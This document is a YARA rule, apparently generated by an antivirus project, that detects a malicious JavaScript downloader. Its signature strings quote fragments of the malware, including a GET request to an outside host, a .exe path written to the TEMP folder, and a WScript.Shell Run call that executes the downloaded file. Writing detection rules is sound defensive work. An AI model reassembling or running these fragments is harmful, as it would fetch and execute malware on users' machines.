rule sig_20160330_79a15fccd871d15b1c2917b310119c26 {
  meta:
    description = "datamaliciousorder - file 20160330_79a15fccd871d15b1c2917b310119c26.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d267ef07940d70e45c356381c2029391df27595941df60b5ebeb4ed2276345bb"

  strings:
    $s1  = "function vR() {return Dd[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"1S2ETQTrb7x.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[M](k0() * 11); if (Ix[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "function x(Bq, Gh){N = N * 1; return Bq - Gh;};" fullword ascii
    $s4  = "Ix[m](\"GET\", \"http://kingsstaging.consines.in/l9osaw\", false);" fullword ascii
    $s5  = "var Dd = function Kf() {return WScript[RH](\"WScript.Shell\");}(), BW = 11;" fullword ascii
    $s6  = "function aF(){return \"\" + pK;};" fullword ascii
    $s7  = "function Rv(o){Dd[\"Run\"](o, N, N);};" fullword ascii
    $s8  = "function k() {return ((p0 == true) && (p0 == ha)) ? 1 : N;};" fullword ascii
    $s9  = "function k0(){return 22;};" fullword ascii
    $s10 = "function r(){return RH;};" fullword ascii
    $s11 = "return x(rI, Az);" fullword ascii
    $s12 = "var sd = new this[\"Date\"]();" fullword ascii
    $s13 = "function rO()" fullword ascii
    $s14 = " while (Fb){" fullword ascii
    $s15 = "function a(j) {var q = (1, 2, 3, 4, 5, j); return q;};" fullword ascii
    $s16 = "ha = true; " fullword ascii
    $s17 = "var p0 = false;" fullword ascii
    $s18 = "p0 = true; " fullword ascii
    $s19 = "var ha = false;" fullword ascii
    $s20 = "var oJ = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}